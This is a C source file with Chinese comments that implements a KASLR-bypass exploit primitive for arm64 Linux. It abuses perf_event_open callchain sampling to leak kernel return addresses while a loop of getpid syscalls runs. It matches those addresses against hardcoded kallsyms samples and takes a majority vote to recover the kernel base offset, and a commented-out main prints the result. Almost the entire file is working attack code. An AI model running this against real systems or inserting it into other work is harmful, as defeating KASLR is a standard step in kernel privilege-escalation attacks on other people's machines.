#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>

#define PAGE_SIZE 4096

/* ---------------- perf 上下文字面量 ---------------- */
#define PERF_CONTEXT_HV           (~0ULL - 31)
#define PERF_CONTEXT_KERNEL       (~0ULL - 127)
#define PERF_CONTEXT_USER         (~0ULL - 511)
#define PERF_CONTEXT_GUEST        (~0ULL - 2047)
#define PERF_CONTEXT_GUEST_KERNEL (~0ULL - 2175)
#define PERF_CONTEXT_GUEST_USER   (~0ULL - 2303)

/* ---------------- 硬编码 kallsyms 样本 ---------------- */
struct known_site { unsigned long long addr; };

static const struct known_site known_sites[] = {
    { 0xffffffc0080113e0ULL }, /* el0t_64_sync              */
    { 0xffffffc0080700dcULL }, /* invoke_syscall            */
    { 0xffffffc00814c578ULL }, /* __arm64_sys_mmap          */
    { 0xffffffc0084a1a58ULL }, /* do_el0_svc                */
    { 0xffffffc00906b3f4ULL }, /* el0t_64_sync_handler      */
    { 0xffffffc00906b4d8ULL }, /* el0_svc                   */
    { 0xffffffc008011584ULL }, /* el0t_64_sync+0x1a4        */
    { 0xffffffc008070134ULL }, /* invoke_syscall+0x58       */
    { 0xffffffc0084a1ab0ULL }, /* do_el0_svc+0x58           */
    { 0xffffffc00906b504ULL }, /* el0_svc+0x2c              */
    { 0xffffffc00906b438ULL }, /* el0t_64_sync_handler+0x44 */
    { 0xffffffc0084a1a94ULL }, /* do_el0_svc+0x3c           */
};
#define N_SITES (sizeof(known_sites) / sizeof(known_sites[0]))

/* arm64 KASLR 2MB 对齐 */
#define KASLR_ALIGN_MASK ((1ULL << 21) - 1ULL)

/* ============================================================
 * get_kaslr_offset
 *
 *   完整流程：perf open → mmap → enable → 触发 syscall →
 *             disable → 读 ring buffer → 收集内核地址 →
 *             munmap/close → 低21位匹配 + 多数投票
 *
 *   返回：最可能的 KASLR 偏移（64 位）。
 *         失败返回 0（偏移为 0 也意味着 KASLR 关闭，语义一致）。
 * ============================================================ */
unsigned long long get_kaslr_offset(void)
{
    struct perf_event_attr pe;
    int fd = -1;
    void *buf = MAP_FAILED;
    struct perf_event_mmap_page *meta;
    struct perf_event_header *event;

    /* 投票表 */
    struct vote { unsigned long long off; int count; } votes[128];
    int nvotes = 0;

    const size_t ITER = 2000000;

    /* ---- 1. 打开 perf ---- */
    memset(&pe, 0, sizeof(pe));
    pe.type                     = PERF_TYPE_HARDWARE;
    pe.config                   = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_period            = 100000;
    pe.sample_type              = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN
                                | PERF_SAMPLE_TID;
    pe.disabled                 = 1;
    pe.exclude_kernel           = 1;
    pe.exclude_callchain_kernel = 0;
    pe.sample_max_stack         = 32;

    fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd == -1) return 0;

    buf = mmap(NULL, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }
    meta = (struct perf_event_mmap_page *)buf;

    /* ---- 2. 采样 ---- */
    ioctl(fd, PERF_EVENT_IOC_RESET,  0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    for (volatile size_t i = 0; i < ITER; i++)
        syscall(__NR_getpid);

    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    /* ---- 3. 读 ring buffer，边读边投票 ---- */
    {
        unsigned long long head = meta->data_head;
        __sync_synchronize();
        unsigned long long tail = meta->data_tail;

        while (tail < head) {
            event = (struct perf_event_header *)
                    ((char *)buf + PAGE_SIZE + (tail % PAGE_SIZE));

            if (event->type == PERF_RECORD_SAMPLE) {
                unsigned char *p = (unsigned char *)event + sizeof(*event);

                unsigned long long ip;
                memcpy(&ip, p, sizeof(ip)); p += sizeof(ip);
                p += sizeof(unsigned int) * 2;              /* 跳过 pid/tid */

                unsigned long long nr;
                memcpy(&nr, p, sizeof(nr)); p += sizeof(nr);

                /* 收集这一个采样点里所有的内核地址 */
                unsigned long long local[64];
                size_t nlocal = 0;

                if (ip >= 0xffff800000000000ULL && nlocal < 64)
                    local[nlocal++] = ip;

                for (unsigned long long i = 0; i < nr && nlocal < 64; i++) {
                    unsigned long long a;
                    memcpy(&a, p, sizeof(a)); p += sizeof(a);
                    if (a >= 0xffff800000000000ULL)
                        local[nlocal++] = a;
                }

                /* 对本地地址逐个匹配投票 */
                for (size_t i = 0; i < nlocal; i++) {
                    unsigned long long lo = local[i] & KASLR_ALIGN_MASK;

                    for (size_t j = 0; j < N_SITES; j++) {
                        if ((known_sites[j].addr & KASLR_ALIGN_MASK) != lo)
                            continue;

                        unsigned long long off = local[i] - known_sites[j].addr;
                        if (off >= (1ULL << 40))
                            continue;   /* 只接受正向、合理范围内的偏移 */

                        int found = 0;
                        for (int k = 0; k < nvotes; k++) {
                            if (votes[k].off == off) {
                                votes[k].count++;
                                found = 1;
                                break;
                            }
                        }
                        if (!found && nvotes < 128) {
                            votes[nvotes].off   = off;
                            votes[nvotes].count = 1;
                            nvotes++;
                        }
                        break;   /* 每个地址最多投一票 */
                    }
                }
            }

            tail += event->size;
            meta->data_tail = tail;
            if ((tail % PAGE_SIZE) > PAGE_SIZE - sizeof(struct perf_event_header))
                break;
        }
    }

    /* ---- 4. 清理 ---- */
    munmap(buf, PAGE_SIZE * 2);
    close(fd);

    /* ---- 5. 取票数最高的偏移 ---- */
    if (nvotes == 0) return 0;

    int best = 0;
    for (int k = 1; k < nvotes; k++)
        if (votes[k].count > votes[best].count) best = k;

    return votes[best].off;
}

/* ============================================================
 * 使用示例
 * ============================================================ */
/*int main(void)
{
    unsigned long long off = get_kaslr_offset();

    if (off == 0) {
        printf("[!] 无法推断 KASLR 偏移（或 KASLR 已关闭）。\n");
        return 1;
    }

    printf("KASLR 偏移 : 0x%012llx\n", off);
    printf("内核基址   : 0x%016llx\n", 0xffffffc008000000ULL + off);
    return 0;
}*/
